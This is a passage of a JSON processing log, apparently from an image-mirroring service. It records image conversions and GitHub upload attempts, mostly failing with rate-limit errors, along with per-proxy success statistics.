mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn11/contents/2020/09/05/07-31-22-719_c013459e3d70e382.webp","historyStatusCode":[],"spendMs":39},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.6 KB","destSize":"23.2 KB","compressRate":"98.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937101217.png","sourceStatusCode":200,"destWidth":505,"destHeight":486,"sourceBytes":8422,"destBytes":21496,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3205,"convertSpendMs":19,"createdTime":"2020-09-05 15:31:20","host":"us-029*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn83/contents/2020/09/05/07-31-23-513_882b15c56152e002.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:23 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8414:49F8:7CED2D:D2449B:5F533ECA"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn83/contents/2020/09/05/07-31-23-513_882b15c56152e002.webp","historyStatusCode":[],"spendMs":49},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.2 KB","destSize":"21 KB","compressRate":"255.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247575040.jpeg","sourceStatusCode":200,"destWidth":561,"destHeight":241,"sourceBytes":24191,"destBytes":23756,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1449,"convertSpendMs":12,"createdTime":"2020-09-05 15:31:23","host":"us-033*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn11/contents/2020/09/05/07-31-24-635_c013459e3d70e382.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:24 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["A180:6385:7A788F:CE9E93:5F533EC9"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn11/contents/2020/09/05/07-31-24-635_c013459e3d70e382.webp","historyStatusCode":[],"spendMs":50},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.6 KB","destSize":"23.2 KB","compressRate":"98.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937101217.png","sourceStatusCode":200,"destWidth":505,"destHeight":486,"sourceBytes":8422,"destBytes":21496,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1253,"convertSpendMs":10,"createdTime":"2020-09-05 15:31:23","host":"europe67*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn83/contents/2020/09/05/07-31-24-691_882b15c56152e002.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:24 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["A7BC:B50F:11ADB272:156CA0DD:5F533ECB"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn83/contents/2020/09/05/07-31-24-691_882b15c56152e002.webp","historyStatusCode":[],"spendMs":248},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.2 KB","destSize":"21 KB","compressRate":"255.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997496880.png","sourceStatusCode":200,"destWidth":812,"destHeight":653,"sourceBytes":86325,"destBytes":83948,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2725,"convertSpendMs":24,"createdTime":"2020-09-05 15:31:23","host":"us-014*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn99/contents/2020/09/05/07-31-25-946_5a544d830efd24cd.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:25 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["960A:5C09:99418D:14E4C2E:5F533ECB"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn99/contents/2020/09/05/07-31-25-946_5a544d830efd24cd.webp","historyStatusCode":[],"spendMs":50},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"84.3 KB","destSize":"82 KB","compressRate":"97.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500169617.png","sourceStatusCode":200,"destWidth":722,"destHeight":70,"sourceBytes":3538,"destBytes":8116,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3331,"convertSpendMs":4,"createdTime":"2020-09-05 15:31:22","host":"europe65*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn91/contents/2020/09/05/07-31-25-951_5016546b70712724.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:26 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8B72:7A59:D2B0DC7:FEE5188:5F533EC9"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291956"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn91/contents/2020/09/05/07-31-25-951_5016546b70712724.webp","historyStatusCode":[],"spendMs":175},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.5 KB","destSize":"7.9 KB","compressRate":"229.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248212580.jpeg","sourceStatusCode":200,"destWidth":1124,"destHeight":312,"sourceBytes":68750,"destBytes":61800,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2802,"convertSpendMs":19,"createdTime":"2020-09-05 15:31:23","host":"us-002*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn3/contents/2020/09/05/07-31-26-139_f72e43808cfbd10b.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:26 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["BB5A:7D89:8484D5:12CE70D:5F533ECA"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291956"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn3/contents/2020/09/05/07-31-26-139_f72e43808cfbd10b.webp","historyStatusCode":[],"spendMs":42},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"67.1 KB","destSize":"60.4 KB","compressRate":"89.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997496880.png","sourceStatusCode":200,"destWidth":812,"destHeight":653,"sourceBytes":86325,"destBytes":83948,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1711,"convertSpendMs":28,"createdTime":"2020-09-05 15:31:26","host":"us-55*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn99/contents/2020/09/05/07-31-27-695_5a544d830efd24cd.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:27 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["9E64:4ADA:876230:132C0C5:5F533ECE"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291951"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn99/contents/2020/09/05/07-31-27-695_5a544d830efd24cd.webp","historyStatusCode":[],"spendMs":53},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"84.3 KB","destSize":"82 KB","compressRate":"97.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248212580.jpeg","sourceStatusCode":200,"destWidth":1124,"destHeight":312,"sourceBytes":68750,"destBytes":61800,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2900,"convertSpendMs":19,"createdTime":"2020-09-05 15:31:26","host":"europe63*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn3/contents/2020/09/05/07-31-28-839_f72e43808cfbd10b.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sat, 05 Sep 2020 07:31:29 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["B912:5DBE:162116AB:1AC360FF:5F533ECC"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599291956"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn3/contents/2020/09/05/07-31-28-839_f72e43808cfbd10b.webp","historyStatusCode":[],"spendMs":349},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"67.1 KB","destSize":"60.4 KB","compressRate":"89.9%"},null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-032.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-037.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-007.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-028.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-011.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-025.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-020.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-54.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-004.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-016.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-013.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-24.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-55.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-026.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-001.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-25.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-031.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe62.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-014.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-024.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe70.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-038.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe21.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-033.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-008.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-029.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-012.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":5,"resultList":[200,200,200,200,200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-58.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-036.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-019.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-010.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-59.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe67.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-51.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-023.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-040.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579190851916-0NGWMH6LPLVZYHPAAV50/ke17ZwdGBToddI8pDm48kGquRXuSNM8VNiRz-JE3cjFZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIiuQFkNGSHnwfzV1gwJ8nndsfNWuEXxXBQeWWtn1_abk/Fig1.png?format=1000w","sourceStatusCode":200,"destWidth":818,"destHeight":784,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn47@2020_2/2020/09/05/07-30-56-464_76475fd303526faa.webp","sourceBytes":31244,"destBytes":22210,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":992,"convertSpendMs":78,"createdTime":"2020-09-05 15:30:56","host":"us-025*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28,072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.5 KB","destSize":"21.7 KB","compressRate":"71.1%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/14k2p3njv3hbk0yu","sourceStatusCode":200,"destWidth":1080,"destHeight":459,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn35@2020_1/2020/09/05/07-30-57-449_f0554844f863fb68.webp","sourceBytes":196865,"destBytes":44988,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2304,"convertSpendMs":33,"createdTime":"2020-09-05 15:30:56","host":"europe21*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5,6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"192.3 KB","destSize":"43.9 KB","compressRate":"22.9%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/03020337/pkehprr73i5i31fd","sourceStatusCode":200,"destWidth":1080,"destHeight":460,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn67@2020_2/2020/09/05/07-30-58-294_eb78c56c01163458.webp","sourceBytes":169556,"destBytes":27972,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2830,"convertSpendMs":48,"createdTime":"2020-09-05 15:30:56","host":"us-029*","referer":"https://www.4hou.com/posts/62w9","linkMd5ListStr":"d4990d794912cd0e310810f1323b377f,d4990d794912cd0e310810f1323b377f","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"165.6 KB","destSize":"27.3 KB","compressRate":"16.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192113206882.jpeg","sourceStatusCode":200,"destWidth":1080,"destHeight":608,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn60@2020_4/2020/09/05/07-30-59-580_2da8446c5e394fd9.webp","sourceBytes":72889,"destBytes":61314,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4583,"convertSpendMs":24,"createdTime":"2020-09-05 15:30:56","host":"europe63*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8,04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"71.2 KB","destSize":"59.9 